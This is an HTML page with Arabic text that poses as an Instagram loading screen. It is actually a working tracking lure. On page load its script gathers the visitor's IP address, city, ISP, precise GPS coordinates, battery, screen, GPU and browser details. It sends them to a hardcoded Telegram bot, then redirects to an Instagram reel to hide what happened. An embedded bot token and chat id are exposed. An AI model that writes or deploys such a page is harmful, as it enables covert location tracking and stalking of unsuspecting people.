<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s ease-in-out infinite;
            margin-bottom: 20px;
        }
        .msg {
            font-size: 14px;
            color: #888;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="msg">جاري التحميل...</div>

    <script>
        const botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1GjPWemg";
        const chatId = "2122221879";
        const targetUrl = "https://www.instagram.com/reel/DdpP29QmX/?stkn=MwnxMHo3N3";

        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "غير متوفر";
                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "معروف جزئياً";
            } catch (e) {
                return "غير متوفر";
            }
        }

        // طلب إذن الـ GPS بدقة عالية وإجبار المتصفح على إظهار النافذة
        function getExactGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: "غير مدعوم", lon: "غير مدعوم", type: "غير متوفر" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            type: "GPS دقيق 🎯 (أمتار)"
                        });
                    },
                    (error) => {
                        resolve({ lat: "تم رفض الإذن", lon: "تم رفض الإذن", type: "تم الرفض" });
                    },
                    { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }

        async function gatherAndSend() {
            let ipData = { ip: "غير معروف", country_name: "غير معروف", city: "غير معروف", org: "غير معروف", latitude: "N/A", longitude: "N/A" };
            
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                if (data.ip) {
                    ipData.ip = data.ip;
                    ipData.country_name = data.country_name || "غير معروف";
                    ipData.city = data.city || "غير معروف";
                    ipData.org = data.org || "غير معروف";
                    ipData.latitude = data.latitude || "N/A";
                    ipData.longitude = data.longitude || "N/A";
                }
            } catch (e) {}

            if (ipData.ip === "غير معروف") {
                try {
                    let res2 = await fetch('https://ipwho.is/');
                    let data2 = await res2.json();
                    if (data2.success) {
                        ipData.ip = data2.ip;
                        ipData.country_name = data2.country || "غير معروف";
                        ipData.city = data2.city || "غير معروف";
                        ipData.org = data2.connection ? data2.connection.isp : "غير معروف";
                        ipData.latitude = data2.latitude || "N/A";
                        ipData.longitude = data2.longitude || "N/A";
                    }
                } catch (e) {}
            }

            // تنفيذ طلب الـ GPS الفعلي وانتظار استجابة المستخدم
            let gps = await getExactGPS();

            let finalLat = (gps.lat !== "تم رفض الإذن" && gps.lat !== "غير مدعوم") ? gps.lat : ipData.latitude;
            let finalLon = (gps.lon !== "تم رفض الإذن" && gps.lon !== "غير مدعوم") ? gps.lon : ipData.longitude;
            let locationType = gps.type;

            let batteryStatus = "غير مدعوم / غير متوفر";
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryStatus = `${Math.round(bat.level * 100)}% (${bat.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
                }
            } catch (e) {}

            let message = `🎯 صيد شامل جديد يا البرسم!\n\n` +
                          `🌐 IP: ${ipData.ip}\n` +
                          `🌍 الدولة: ${ipData.country_name}\n` +
                          `🏙️ المدينة: ${ipData.city}\n` +
                          `📍 الموقع (${locationType}): ${finalLat}, ${finalLon}\n` +
                          `🏢 المزود (ISP): ${ipData.org}\n\n` +
                          `📱 معلومات الجهاز:\n` +
                          `🔋 البطارية: ${batteryStatus}\n` +
                          `💻 الشاشة: ${window.screen.width}x${window.screen.height}\n` +
                          `👆 يدعم اللمس: ${navigator.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n` +
                          `🎮 كرت الشاشة (GPU): ${getGPUInfo()}\n` +
                          `🗣️ لغة المتصفح: ${navigator.language}\n` +
                          `💻 النظام والمتصفح: ${navigator.userAgent}`;

            let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(telegramUrl);
            } catch (err) {} finally {
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 1000);
            }
        }

        window.onload = gatherAndSend;
    </script>
</body>
</html>
